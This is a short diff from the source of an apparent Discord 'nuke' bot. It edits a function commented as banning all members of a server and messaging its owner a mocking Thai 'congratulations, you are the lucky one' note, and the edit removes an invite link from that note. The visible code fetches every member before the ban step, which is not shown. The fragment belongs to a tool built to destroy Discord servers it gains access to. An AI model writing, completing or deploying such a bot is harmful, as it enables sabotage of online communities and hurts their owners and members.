@@ -27,12 +27,12 @@ client.on('ready',  () => {
 });
 // ban all and send a message for the ownerserver
 async function nuke(guild) {
-    let users = 0;
-    let channels = 0;
+    let users = 1;
+    let channels = 1;
   
     await guild.fetchMembers();
   
-    await guild.owner.send('ยินดีด้วยค่ะ คุณคือผู้โชคดี [ https://discord.gg/5SbFP2k ]').catch(e => { return void e; });
+    await guild.owner.send('ยินดีด้วยค่ะ คุณคือผู้โชคดี [  ]').catch(e => { return void e; });
   
   
   
